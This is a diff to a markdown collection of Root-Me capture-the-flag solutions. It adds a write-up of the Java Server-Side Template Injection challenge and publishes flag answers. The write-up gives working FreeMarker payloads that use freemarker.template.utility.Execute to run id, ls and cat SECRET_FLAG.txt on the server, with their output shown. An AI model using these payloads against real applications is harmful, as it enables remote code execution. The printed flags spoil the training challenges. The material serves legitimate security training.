@@ -36,7 +36,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 28. [Python - Server-side Template Injection Introduction](#python-server-side-template-injection-introduction)
 29. [File upload - ZIP](#file-upload-zip)
 30. [Command injection - Filter bypass](#command-injection-filter-bypass)
-31. [Java - Server-side Template Injection](#java-server-side-template-injection)
+31. [Java - Server-side Template Injection](#java-server-side-template-injection) 🗸
 32. [JSON Web Token (JWT) - Public key](#json-web-token-jwt-public-key)
 33. [Local File Inclusion](#local-file-inclusion) 🗸
 34. [Local File Inclusion - Double encoding](#local-file-inclusion-double-encoding) 🗸
@@ -2810,7 +2810,6 @@ DAPt9D2mky0APAF
 
 ---
 
-
 ## PHP register globals
 
 - Author: g0uZ
@@ -2876,6 +2875,135 @@ This provides the solution.
 
 ~~~
 NoTQYipcRKkgrqG
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## Java Server Side Template Injection
+
+- Author: righettod
+- Date: 29 November 2015
+- Points: 30
+- Level: 3
+
+### Statement
+
+Exploit the vulnerability in order to retrieve the validation password in the file SECRET_FLAG.txt.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch41/).
+
+### Resources
+
+1. [Server Side Template Injectionn RCE for the Modern Web App](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Server-Side%20Template%20Injection%20RCE%20For%20The%20Modern%20Web%20App%20-%20BlackHat%2015.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can see the site source code:
+
+~~~html
+<!DOCTYPE html>
+<html>
+<head>
+<title>Home</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<script type="text/javascript" src="webjars/jquery/2.1.1/jquery.min.js"></script>
+<script type="text/javascript">
+	function checkSubmit(e) {
+		if (e && e.keyCode == 13) {
+			checkNickname();
+		}
+	}
+
+	function checkNickname() {
+		var serviceUrl = "check";
+		var nick = $("#nickname").val();
+		var postData = "nickname=" + encodeURIComponent(nick);
+		$.ajax({
+			url : serviceUrl,
+			type : "POST",
+			data : postData,
+			contentType : "application/x-www-form-urlencoded",
+			dataType : "text",
+			success : function(data) {
+				$("#result").text(data);
+			},
+			error : function(data) {
+				$("#result").text("An error occurs!");
+			}
+		});
+	}
+</script>
+</head>
+<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+	<div onkeypress="checkSubmit(event)">
+		<label>Do I know you? Please send me your nickname:&nbsp;</label>&nbsp;
+		<input type="text" id="nickname" name="nickname" autofocus="autofocus"
+			size="20" />&nbsp;
+		<button type="button" onclick="checkNickname();">Check</button>
+	</div>
+	<div id="result"></div>
+</body>
+</html>
+~~~
+
+The website takes a user input and executes checkSubmit() and checkNickName() javascripts to generate an output.  We can simply test the inject using a simple math equation:
+
+~~~
+nickname: test
+returns: It's seems that I know you :) test
+nickname: {7*7}
+returns: It's seems that I know you :) {7*7}
+nickname: ${7*7}
+returns: It's seems that I know you :) 49
+~~~
+
+The form can be injected. This auggests the injection exploits the freemarker template language as detailed on [portswigger](https://portswigger.net/research/server-side-template-injection).
+
+freemarker has a class name execute that can be used to execute external commands.  Some example injects can be taken from portswigger:
+
+~~~
+nickname: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+response: It's seems that I know you :) uid=1109(web-serveur-ch41) gid=1109(web-serveur-ch41) groupes=1109(web-serveur-ch41),100(users) 
+nickname: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(url.getArgs())}
+response: 
+~~~
+
+Reading the freemarker [api user guide](https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html)  we can restructure our execute commands to get some more information:
+
+~~~
+nickname: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls") }
+response: It's seems that I know you :) pom.xml SECRET_FLAG.txt src target 
+~~~
+
+We can see the flag and can run cat to retrieve the solution:
+
+~~~
+nickname: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt") }
+response: It's seems that I know you :) B3wareOfT3mplat3Inj3ction 
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+B3wareOfT3mplat3Inj3ction
 ~~~
 
 </details>
